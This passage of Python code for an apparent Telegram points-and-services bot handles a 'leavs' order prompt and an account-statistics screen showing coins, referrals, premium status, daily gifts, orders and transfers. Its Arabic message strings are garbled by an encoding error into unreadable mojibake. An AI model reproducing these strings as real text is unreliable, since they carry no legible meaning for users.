            x = bot.edit_message_text(text='Ø§Ø±Ø³Ù„ Ø±Ø§Ø¨Ø· Ø§Ø°Ø§ Ø§Ù„Ù‚Ù†Ø§Ø© Ø®Ø§ØµÙ‡ØŒ Ø§Ø°Ø§ Ø¹Ø§Ù…Ù‡ Ø§Ø±Ø³Ù„ Ù…Ø¹Ø±ÙÙ‡Ø§ ÙÙ‚Ø·ØŸ',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'leavs'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'account':
        if not check_user(cid):
            return start_message(call.message)
        acc = get(cid)
        user_id = call.from_user.id
        coins, users = acc['coins'], len(get(cid)['users'])
        info = db.get(f"user_{call.from_user.id}")
        daily_count = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
        daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
        all_gift = daily_count * daily_gift
        buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
        trans = int(db.get(f"user_{user_id}_trans")) if db.exists(f"user_{user_id}_trans") else 0
        y = trend()
        prem = 'Premium' if info['premium'] == True else 'Free'
        textt = f'''
â€¢ [â‡ï¸] Ø¹Ø¯Ø¯ Ù†Ù‚Ø§Ø· Ø­Ø³Ø§Ø¨Ùƒ : {coins}
â€¢ [ğŸŒ€] Ø¹Ø¯Ø¯ Ø¹Ù…Ù„ÙŠØ§Øª Ø§Ù„Ø§Ø­Ø§Ù„Ù‡ Ø§Ù„ØªÙŠ Ù‚Ù…Øª Ø¨Ù‡Ø§ : {users}
â€¢ [ğŸ‘¤] Ù†ÙˆØ¹ Ø§Ø´ØªØ±Ø§ÙƒÙƒ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¨ÙˆØª : {prem}
â€¢ [ğŸ] Ø¹Ø¯Ø¯ Ø§Ù„Ù‡Ø¯Ø§ÙŠØ§ Ø§Ù„ÙŠÙˆÙ…ÙŠØ© Ø§Ù„ØªÙŠ Ø¬Ù…Ø¹ØªÙ‡Ø§ : {daily_count}
â€¢ [â‡ï¸] Ø¹Ø¯Ø¯ Ø§Ù„Ù†Ù‚Ø§Ø· Ø§Ù„Ù„ÙŠ Ø¬Ù…Ø¹ØªÙ‡Ø§ Ù…Ù† Ø§Ù„Ù‡Ø¯Ø§ÙŠØ§ Ø§Ù„ÙŠÙˆÙ…ÙŠØ© : {all_gift}
â€¢ [ğŸ“®] Ø¹Ø¯Ø¯ Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„ØªÙŠ Ø·Ù„Ø¨ØªÙ‡Ø§ : {buys}
â€¢ [â™»ï¸] Ø¹Ø¯Ø¯ Ø§Ù„ØªØ­ÙˆÙŠÙ„Ø§Øª Ø§Ù„ØªÙŠ Ù‚Ù…Øª Ø¨Ù‡Ø§ : {trans}

{y}'''
        bot.edit_message_text(text=textt,chat_id=cid,message_id=mid,reply_markup=bk)
   
